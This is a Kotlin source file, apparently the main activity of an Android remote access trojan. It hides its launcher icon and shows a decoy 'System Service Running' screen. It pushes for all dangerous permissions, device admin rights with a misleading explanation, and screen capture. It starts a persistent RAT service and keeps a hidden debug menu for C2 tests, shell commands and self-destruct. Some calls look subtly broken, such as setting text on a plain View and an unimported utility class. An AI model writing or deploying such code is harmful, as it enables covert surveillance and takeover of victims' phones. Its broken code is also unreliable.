package com.rat.client

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.rat.client.crypto.EncryptionUtils
import com.rat.client.service.MediaProjectionService
import com.rat.client.service.RatService
import com.rat.client.service.ScreenCaptureService
import com.rat.client.util.DeviceUtils
import com.rat.client.util.NetworkUtils
import com.rat.client.util.PermissionsManager
import com.rat.client.util.PreferencesManager
import com.rat.client.util.SystemUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "MainActivity"
        private const val REQUEST_CODE_PERMISSIONS = 1000
        private const val REQUEST_CODE_OVERLAY = 1001
        private const val REQUEST_CODE_BATTERY = 1002
        private const val REQUEST_CODE_DEVICE_ADMIN = 1003
        private const val REQUEST_CODE_MEDIA_PROJECTION = 1004
        private const val REQUEST_CODE_ACCESSIBILITY = 1005
        private const val REQUEST_CODE_USAGE_STATS = 1006
        private const val REQUEST_CODE_NOTIFICATION_LISTENER = 1007
        private const val REQUEST_CODE_INSTALL_PACKAGES = 1008
        private const val REQUEST_CODE_MANAGE_STORAGE = 1009
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize utilities
        PreferencesManager.init(this)
        DeviceUtils.init(this)
        SystemUtils.init(this)

        // Hide the app icon if configured
        if (PreferencesManager.getBoolean("hide_icon", false)) {
            hideAppIcon()
        }

        // Request critical permissions
        requestCriticalPermissions()

        // Setup UI
        setupUI()

        // Start service if not running
        startRatService()
    }

    override fun onResume() {
        super.onResume()
        // Check permissions on resume
        checkAndRequestMissingPermissions()
    }

    private fun setupUI() {
        // Minimal UI - just a status indicator
        findViewById<View>(R.id.status_text).text = "System Service Running"
        findViewById<View>(R.id.version_text).text = "v${BuildConfig.VERSION_NAME}"

        // Hidden buttons for testing (long press)
        findViewById<View>(R.id.status_text).setOnLongClickListener {
            showDebugMenu()
            true
        }
    }

    private fun showDebugMenu() {
        val items = arrayOf(
            "Request All Permissions",
            "Enable Device Admin",
            "Start Media Projection",
            "Start Screen Capture",
            "Test C2 Connection",
            "Show Device Info",
            "Show Network Info",
            "Test Shell Command",
            "Toggle Icon Visibility",
            "Self Destruct"
        )

        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("RAT Debug Menu")
            .setItems(items) { _, which ->
                when (which) {
                    0 -> requestCriticalPermissions()
                    1 -> requestDeviceAdmin()
                    2 -> requestMediaProjection()
                    3 -> requestScreenCapture()
                    4 -> testC2Connection()
                    5 -> showDeviceInfo()
                    6 -> showNetworkInfo()
                    7 -> testShellCommand()
                    8 -> toggleIconVisibility()
                    9 -> selfDestruct()
                }
            }
            .show()
    }

    private fun requestCriticalPermissions() {
        PermissionsManager.requestAllCriticalPermissions(this)
    }

    private fun checkAndRequestMissingPermissions() {
        val denied = PermissionsManager.getDeniedPermissions(this)
        if (denied.isNotEmpty()) {
            val criticalDenied = denied.filter { PermissionsManager.isPermissionDangerous(it) }
            if (criticalDenied.isNotEmpty()) {
                PermissionsManager.requestPermissions(this, criticalDenied, REQUEST_CODE_PERMISSIONS)
            }
        }
    }

    private fun requestDeviceAdmin() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, DeviceAdminReceiverImpl::class.java)
        if (!dpm.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable for device management features")
            }
            startActivityForResult(intent, REQUEST_CODE_DEVICE_ADMIN)
        } else {
            Toast.makeText(this, "Device Admin already enabled", Toast.LENGTH_SHORT).show()
        }
    }

    private fun requestMediaProjection() {
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_CODE_MEDIA_PROJECTION)
    }

    private fun requestScreenCapture() {
        ScreenCaptureService.requestScreenCapture(this)
    }

    private fun testC2Connection() {
        val service = RatService.getInstance()
        service?.sendCommand("test", EncryptionUtils.encrypt("{\"test\":true}"))
        Toast.makeText(this, "Test command sent", Toast.LENGTH_SHORT).show()
    }

    private fun showDeviceInfo() {
        val info = DeviceUtils.collectDeviceInfo(this)
        val json = com.google.gson.Gson().toJson(info)
        Log.d(TAG, "Device Info: $json")
        Toast.makeText(this, "Device info logged (check logcat)", Toast.LENGTH_SHORT).show()
    }

    private fun showNetworkInfo() {
        val info = NetworkUtils.getNetworkInfo(this)
        val json = com.google.gson.Gson().toJson(info)
        Log.d(TAG, "Network Info: $json")
        Toast.makeText(this, "Network info logged (check logcat)", Toast.LENGTH_SHORT).show()
    }

    private fun testShellCommand() {
        val result = SystemUtils.executeShellCommand("id")
        val json = com.google.gson.Gson().toJson(result)
        Log.d(TAG, "Shell Result: $json")
        Toast.makeText(this, "Shell result logged (check logcat)", Toast.LENGTH_SHORT).show()
    }

    private fun toggleIconVisibility() {
        val hidden = PreferencesManager.getBoolean("hide_icon", false)
        PreferencesManager.putBoolean("hide_icon", !hidden)
        if (!hidden) {
            hideAppIcon()
        } else {
            showAppIcon()
        }
        Toast.makeText(this, "Icon ${if (hidden) "shown" else "hidden"}", Toast.LENGTH_SHORT).show()
    }

    private fun hideAppIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun showAppIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun selfDestruct() {
        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("Self Destruct")
            .setMessage("This will wipe all app data and uninstall the app. Continue?")
            .setPositiveButton("Yes") { _, _ ->
                FileUtils.wipeAppData(this)
                val intent = Intent(Intent.ACTION_DELETE).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
                android.os.Process.killProcess(android.os.Process.myPid())
            }
            .setNegativeButton("No", null)
            .show()
    }

    private fun startRatService() {
        val intent = Intent(this, RatService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        PermissionsManager.handlePermissionResult(
            requestCode,
            permissions,
            grantResults,
            onGranted = { perm ->
                Log.d(TAG, "Permission granted: $perm")
            },
            onDenied = { perm, shouldShowRationale ->
                Log.w(TAG, "Permission denied: $perm, rationale: $shouldShowRationale")
                if (!shouldShowRationale) {
                    // Permission permanently denied, show settings dialog
                    showPermissionSettingsDialog(perm)
                }
            }
        )
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            REQUEST_CODE_DEVICE_ADMIN -> {
                if (resultCode == Activity.RESULT_OK) {
                    Toast.makeText(this, "Device Admin enabled", Toast.LENGTH_SHORT).show()
                }
            }
            REQUEST_CODE_MEDIA_PROJECTION -> {
                if (resultCode == Activity.RESULT_OK && data != null) {
                    MediaProjectionService.setMediaProjectionData(resultCode, data)
                    Toast.makeText(this, "Media projection granted", Toast.LENGTH_SHORT).show()
                }
            }
            REQUEST_CODE_OVERLAY -> {
                if (Settings.canDrawOverlays(this)) {
                    Toast.makeText(this, "Overlay permission granted", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    private fun showPermissionSettingsDialog(permission: String) {
        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("Permission Required")
            .setMessage("The permission ${PermissionsManager.getPermissionDescription(permission)} is required for this app to function. Please enable it in settings.")
            .setPositiveButton("Open Settings") { _, _ ->
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
            .setNegativeButton("Cancel", null)
            .show()
    }
}